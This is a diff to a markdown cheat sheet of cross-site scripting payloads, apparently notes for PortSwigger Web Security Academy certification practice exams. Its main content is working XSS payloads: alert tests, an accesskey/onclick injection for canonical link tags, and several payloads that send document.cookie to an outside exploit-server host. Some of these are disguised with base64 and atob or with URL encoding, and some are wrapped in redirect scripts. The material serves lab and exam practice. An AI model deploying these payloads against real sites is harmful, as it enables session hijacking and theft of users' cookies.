@@ -258,29 +258,40 @@ location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+o
 <svg><animatetransform onbegin=alert(1) attributeName=transform>
 ```
 **canonical link tags**
-```html
+```
 %27accesskey=%27x%27onclick=%27alert(1)%27x=%27
 ```
 ## Practice exams payloads
-```html
+#### App 1
+```
 \\"-alert('XSS')}//
 \\"-eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))}//
-
-after search term url encode + base64 for atob and encode for quotes
+```
+For SearchTerm: base64 for atob string --> urlencode for full value of SearchTerm, i.e:
+```
+<@urlencode>\\"-eval(atob("<@base64>document.
+location='https://exploit-...exploit-server.net/random?c='+document.cookie</@base64>"))}//'</@urlencode>"
+```
+```html
 <script>
 window.location.replace("https://...web-security-academy.net/?SearchTerm=\\"-eval(atob("document.
 location='https://exploit-...exploit-server.net/random?c='+document.cookie"))}//'");
 </script>
+```
 
+#### App2
+```
 alert`1`
 \\"-alert`1`}//
 "-eval`${document.location="https://exploit-...exploit-server.net/random?c="+document.cookie}`-"
-
+```
+```html
 <script>
 document.location="https://...web-security-academy.net/?find="-eval`${document.
 location='https://exploit-...exploit-server.net/random?c='+document.cookie}`-""
 </script> - but "" will ruin everything, so encode second part inside find=
 ```
+#### wr3dmast3r
 Some payloads from wr3dmast3r article about [BSCP certification](https://habr.com/en/companies/jetinfosystems/articles/805297/).
 ```html
 "-prompt(1)-"
